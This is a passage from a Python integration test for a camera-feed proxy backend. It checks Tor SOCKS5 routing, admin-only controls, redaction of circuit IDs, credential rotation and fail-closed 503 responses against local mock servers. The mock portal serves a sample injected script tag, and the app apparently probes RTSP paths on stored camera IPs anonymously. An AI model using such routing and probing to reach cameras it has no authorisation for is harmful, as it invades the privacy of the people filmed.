        print("[*] Testing Tor Proxy Routing, Circuit Rotation, RTSP Bridge & Fail-Closed (503)...")
        import socket
        from backend.services.tor_service import tor_service
        from backend.services.rtsp_resolver import rtsp_resolver

        client.cookies.clear()
        fresh_csrf_res = await client.get("/api/security/csrf")
        assert fresh_csrf_res.status_code == 200
        tor_csrf_token = fresh_csrf_res.json()["csrf_token"]
        tor_post_headers = {"X-CSRF-Token": tor_csrf_token}
        tor_admin_headers = {**headers, "X-CSRF-Token": tor_csrf_token}

        # 17a. Verify Tor is disabled by default and non-admins cannot see relay/circuit details or toggle Tor
        tor_def_res = await client.get("/api/tor/status")
        assert tor_def_res.status_code == 200
        tor_def_json = tor_def_res.json()
        assert tor_def_json["enabled"] is False, "Tor MUST be disabled by default!"
        assert tor_def_json["circuit_id"] == "hidden", f"Expected redacted circuit_id for non-admin, got {tor_def_json}"
        assert tor_def_json["socks_host"] == "hidden" and tor_def_json["socks_port"] == 0
        health_def_res = await client.get("/api/health")
        assert health_def_res.status_code == 200
        assert health_def_res.json()["tor_enabled"] is False
        assert "tor_circuit_id" not in health_def_res.json(), "Public /api/health must not expose tor_circuit_id!"

        unauth_cfg = await client.post("/api/tor/config", json={"enabled": True}, headers=tor_post_headers)
        assert unauth_cfg.status_code == 401, f"Expected 401 for non-admin /api/tor/config, got {unauth_cfg.status_code}"
        unauth_rot = await client.post("/api/tor/rotate", headers=tor_post_headers)
        assert unauth_rot.status_code == 401, f"Expected 401 for non-admin /api/tor/rotate, got {unauth_rot.status_code}"
        print("    -> Confirmed Tor defaults to OFF, non-admin status is redacted, and Tor toggles/rotations require Admin (401)")

        # Start mock target camera server (handles both HTTP image/portal & RTSP OPTIONS)
        target_hits = 0

        async def handle_tor_target_cam(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
            nonlocal target_hits
            try:
                raw_req = await asyncio.wait_for(reader.read(4096), timeout=3.0)
                if not raw_req:
                    return
                target_hits += 1
                text_req = raw_req.decode("utf-8", errors="ignore")
                first_line = text_req.splitlines()[0] if text_req else ""
                if "RTSP/1.0" in first_line:
                    cseq = "1"
                    for ln in text_req.splitlines():
                        if ln.lower().startswith("cseq:"):
                            cseq = ln.split(":", 1)[1].strip()
                            break
                    rtsp_reply = (
                        f"RTSP/1.0 200 OK\r\n"
                        f"CSeq: {cseq}\r\n"
                        f"Public: DESCRIBE, SETUP, PLAY, TEARDOWN\r\n\r\n"
                    ).encode("ascii")
                    writer.write(rtsp_reply)
                    await writer.drain()
                else:
                    req_path = first_line.split(" ")[1] if len(first_line.split(" ")) >= 2 else "/"
                    if req_path.startswith("/cam.jpg"):
                        hdr = (
                            b"HTTP/1.1 200 OK\r\n"
                            b"Content-Type: image/jpeg\r\n"
                            b"Connection: close\r\n"
                            + f"Content-Length: {len(JPEG_SOI_EOI)}\r\n\r\n".encode()
                        )
                        writer.write(hdr + JPEG_SOI_EOI)
                    else:
                        body = (
                            b"<html><head><title>Tor Cam Portal</title></head>"
                            b"<body><script>evilTorProbe()</script><img src='/cam.jpg'></body></html>"
                        )
                        hdr = (
                            b"HTTP/1.1 200 OK\r\n"
                            b"Content-Type: text/html; charset=utf-8\r\n"
                            b"Connection: close\r\n"
                            + f"Content-Length: {len(body)}\r\n\r\n".encode()
                        )
                        writer.write(hdr + body)
                    await writer.drain()
            except Exception:
                pass
            finally:
                try:
                    writer.close()
                except Exception:
                    pass

        # Start local RFC 1928 + RFC 1929 (0x02 Username/Password) Mock SOCKS5 Server
        socks_events = []

        async def _relay_pipe(src: asyncio.StreamReader, dst: asyncio.StreamWriter):
            try:
                while True:
                    chunk = await src.read(4096)
                    if not chunk:
                        break
                    dst.write(chunk)
                    await dst.drain()
            except Exception:
                pass
            finally:
                try:
                    dst.close()
                except Exception:
                    pass

        async def handle_mock_socks5(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
            up_writer = None
            try:
                ver_n = await reader.readexactly(2)
                if ver_n[0] != 5:
                    return
                methods = await reader.readexactly(ver_n[1])
                uname = ""
                passwd = ""
                if 0x02 in methods:
                    writer.write(b"\x05\x02")
                    await writer.drain()
                    subver = await reader.readexactly(1)
                    if subver[0] != 1:
                        return
                    ulen = (await reader.readexactly(1))[0]
                    uname = (await reader.readexactly(ulen)).decode("utf-8", errors="ignore")
                    plen = (await reader.readexactly(1))[0]
                    passwd = (await reader.readexactly(plen)).decode("utf-8", errors="ignore")
                    writer.write(b"\x01\x00")
                    await writer.drain()
                elif 0x00 in methods:
                    writer.write(b"\x05\x00")
                    await writer.drain()
                else:
                    writer.write(b"\x05\xff")
                    await writer.drain()
                    return

                req_hdr = await reader.readexactly(4)
                if req_hdr[0] != 5 or req_hdr[1] != 1:
                    writer.write(b"\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00")
                    await writer.drain()
                    return
                atyp = req_hdr[3]
                if atyp == 0x01:
                    dst_host = socket.inet_ntoa(await reader.readexactly(4))
                elif atyp == 0x03:
                    dlen = (await reader.readexactly(1))[0]
                    dst_host = (await reader.readexactly(dlen)).decode("utf-8", errors="ignore")
                elif atyp == 0x04:
                    dst_host = socket.inet_ntop(socket.AF_INET6, await reader.readexactly(16))
                else:
                    writer.write(b"\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00")
                    await writer.drain()
                    return
                dst_port = int.from_bytes(await reader.readexactly(2), "big")
                socks_events.append({
                    "user": uname,
                    "password": passwd,
                    "host": dst_host,
                    "port": dst_port,
                })

                up_reader, up_writer = await asyncio.open_connection(dst_host, dst_port)
                writer.write(b"\x05\x00\x00\x01\x7f\x00\x00\x01\x00\x00")
                await writer.drain()

                await asyncio.gather(
                    _relay_pipe(reader, up_writer),
                    _relay_pipe(up_reader, writer),
                    return_exceptions=True,
                )
            except Exception:
                pass
            finally:
                for w in (writer, up_writer):
                    if w is not None:
                        try:
                            w.close()
                        except Exception:
                            pass

        tor_target_srv = await asyncio.start_server(handle_tor_target_cam, "127.0.0.1", 0)
        tor_cam_port = tor_target_srv.sockets[0].getsockname()[1]
        mock_socks_srv = await asyncio.start_server(handle_mock_socks5, "127.0.0.1", 0)
        mock_socks_port = mock_socks_srv.sockets[0].getsockname()[1]
        tor_test_feed_id = f"test_tor_cam_{tor_cam_port}"

        orig_bypass_loopback = tor_service.bypass_loopback
        tor_service.bypass_loopback = False
        try:
            async with AsyncSessionLocal() as db_sess:
                db_sess.add(CameraFeedModel(
                    id=tor_test_feed_id,
                    ip="127.0.0.1",
                    port=tor_cam_port,
                    product="Tor Test Cam",
                    rtsp_url=f"http://127.0.0.1:{tor_cam_port}/cam.jpg",
                    screenshot_url=f"http://127.0.0.1:{tor_cam_port}/cam.jpg",
                    stream_path=tor_test_feed_id,
                    country_code="DE",
                    country_name="Germany"
                ))
                await db_sess.commit()

            # 17b. Enable Tor pointing to mock SOCKS5 proxy (Admin Only)
            cfg_res = await client.post("/api/tor/config", json={
                "enabled": True,
                "auto_rotate": False,
                "socks_host": "127.0.0.1",
                "socks_port": mock_socks_port,
                "control_port": 9051,
            }, headers=tor_admin_headers)
            assert cfg_res.status_code == 200, f"Tor config enable failed: {cfg_res.text}"
            cfg_json = cfg_res.json()
            assert cfg_json["enabled"] is True and cfg_json["socks_alive"] is True
            gen_initial = cfg_json["circuit_generation"]
            cid_initial = cfg_json["circuit_id"]

            # Non-admin /api/tor/status still redacts circuit_id while Tor is active
            pub_active_st = (await client.get("/api/tor/status")).json()
            assert pub_active_st["enabled"] is True
            assert pub_active_st["circuit_id"] == "hidden"

            # HTTP Stream proxy over SOCKS5 (must NOT expose X-Tor-Circuit header)
            ev_count_before = len(socks_events)
            t_stream_res = await client.get("/api/proxy/stream", params={"url": f"http://127.0.0.1:{tor_cam_port}/cam.jpg"})
            assert t_stream_res.status_code == 200, f"Tor proxied /api/proxy/stream failed: {t_stream_res.text}"
            assert t_stream_res.headers.get("x-tor-routed") == "true"
            assert "x-tor-circuit" not in t_stream_res.headers, "Stream proxy must not leak circuit/relay ID!"
            assert len(socks_events) > ev_count_before, "Expected /api/proxy/stream to traverse SOCKS5"
            first_socks_ev = socks_events[-1]
            assert first_socks_ev["host"] == "127.0.0.1" and first_socks_ev["port"] == tor_cam_port
            assert first_socks_ev["user"].startswith("wc_"), f"Expected IsolateSocksAuth username, got {first_socks_ev}"

            # Isolated Web Portal gateway over SOCKS5 (must NOT expose circuit/relay ID)
            ev_count_before = len(socks_events)
            t_web_res = await client.get(
                "/api/proxy/web",
                params={"url": f"http://127.0.0.1:{tor_cam_port}/", "format": "json"}
            )
            assert t_web_res.status_code == 200, f"Tor proxied /api/proxy/web failed: {t_web_res.text}"
            assert t_web_res.headers.get("x-tor-routed") == "true"
            assert "x-tor-circuit" not in t_web_res.headers
            assert t_web_res.json().get("tor_routed") is True
            assert t_web_res.json().get("tor_circuit_id") is None
            assert len(socks_events) > ev_count_before, "Expected /api/proxy/web to traverse SOCKS5"

            # RTSP prober over SOCKS5
            ev_count_before = len(socks_events)
            rtsp_ok, rtsp_code, _, _, _ = await rtsp_resolver.probe_rtsp_path("127.0.0.1", tor_cam_port, "/h264", timeout=2.0)
            assert rtsp_ok is True and rtsp_code == 200, f"RTSP probe over SOCKS5 failed: code={rtsp_code}"
            assert len(socks_events) > ev_count_before, "Expected RTSP probe to traverse SOCKS5"

            # RTSP Bridge (for MediaMTX) over SOCKS5
            ev_count_before = len(socks_events)
            bridge_port = await tor_service.ensure_rtsp_bridge("test_tor_bridge", "127.0.0.1", tor_cam_port)
            br_reader, br_writer = await asyncio.open_connection("127.0.0.1", bridge_port)
            br_writer.write(b"OPTIONS rtsp://127.0.0.1/h264 RTSP/1.0\r\nCSeq: 77\r\n\r\n")
            await br_writer.drain()
            br_resp = (await asyncio.wait_for(br_reader.read(4096), timeout=2.5)).decode("utf-8", errors="ignore")
            br_writer.close()
            await tor_service.stop_rtsp_bridge("test_tor_bridge")
            assert "RTSP/1.0 200 OK" in br_resp and "CSeq: 77" in br_resp, f"RTSP bridge response invalid: {br_resp}"
            assert len(socks_events) > ev_count_before, "Expected MediaMTX RTSP bridge to traverse SOCKS5"
            print("    -> HTTP stream, Web portal, RTSP prober, and RTSP bridge all routed via Tor SOCKS5 with IsolateSocksAuth")

            # 17c. Circuit rotation increments generation & rotates SOCKS5 IsolateSocksAuth credentials
            rot_res = await client.post("/api/tor/rotate", headers=tor_admin_headers)
            assert rot_res.status_code == 200
            rot_json = rot_res.json()
            assert rot_json["circuit_generation"] > gen_initial
            assert rot_json["circuit_id"] != cid_initial

            await client.get("/api/proxy/stream", params={"url": f"http://127.0.0.1:{tor_cam_port}/cam.jpg"})
            rotated_socks_ev = socks_events[-1]
            assert rotated_socks_ev["user"] != first_socks_ev["user"] or rotated_socks_ev["password"] != first_socks_ev["password"], (
                "Expected rotated SOCKS5 IsolateSocksAuth credentials after /api/tor/rotate"
            )
            print(f"    -> Circuit rotation verified ({cid_initial} -> {rot_json['circuit_id']})")

            # 17d. Fail-closed verification: unreachable SOCKS5 proxy must return 503 with ZERO direct leakage
            mock_socks_srv.close()
            await mock_socks_srv.wait_closed()
            # Reserve an unused ephemeral port then immediately close it so SOCKS5 fails closed
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tmp_sock:
                tmp_sock.bind(("127.0.0.1", 0))
                closed_socks_port = tmp_sock.getsockname()[1]

            fc_cfg = await client.post("/api/tor/config", json={
                "enabled": True,
                "auto_rotate": False,
                "socks_host": "127.0.0.1",
                "socks_port": closed_socks_port,
                "control_port": 9051,
            }, headers=tor_admin_headers)
            assert fc_cfg.status_code == 200
            assert fc_cfg.json()["socks_alive"] is False

            hits_before_fc = target_hits
            fc_stream_res = await client.get("/api/proxy/stream", params={"url": f"http://127.0.0.1:{tor_cam_port}/cam.jpg"})
            assert fc_stream_res.status_code == 503, f"Expected fail-closed 503 on /api/proxy/stream, got {fc_stream_res.status_code}"
            fc_web_res = await client.get("/api/proxy/web", params={"url": f"http://127.0.0.1:{tor_cam_port}/", "format": "json"})
            assert fc_web_res.status_code == 503, f"Expected fail-closed 503 on /api/proxy/web, got {fc_web_res.status_code}"
            fc_play_res = await client.post("/api/streams/play", json={"feed_id": tor_test_feed_id}, headers=tor_post_headers)
            assert fc_play_res.status_code == 503, f"Expected fail-closed 503 on /api/streams/play, got {fc_play_res.status_code}"
            assert target_hits == hits_before_fc, "Privacy leak: target camera was contacted directly while Tor was fail-closed!"
            print("    -> Fail-closed privacy guarantee verified (HTTP 503 & 0 direct leak hits when SOCKS5 offline)")
        finally:
            try:
                await client.post("/api/feeds/batch-delete", json={"feed_ids": [tor_test_feed_id]}, headers=tor_admin_headers)
            except Exception:
                pass
            tor_service.bypass_loopback = orig_bypass_loopback
            await tor_service.update_config(
                enabled=False,
                auto_rotate=True,
                socks_host="127.0.0.1",
                socks_port=9050,
                control_port=9051,
            )
            await tor_service.shutdown()
            tor_target_srv.close()
            await tor_target_srv.wait_closed()
            try:
                mock_socks_srv.close()
                await mock_socks_srv.wait_closed()
            except Exception:
                pass

    print("\n[✓] ALL TESTS PASSED SUCCESSFULLY!")

if __name__ == "__main__":
    asyncio.run(test_full_pipeline())

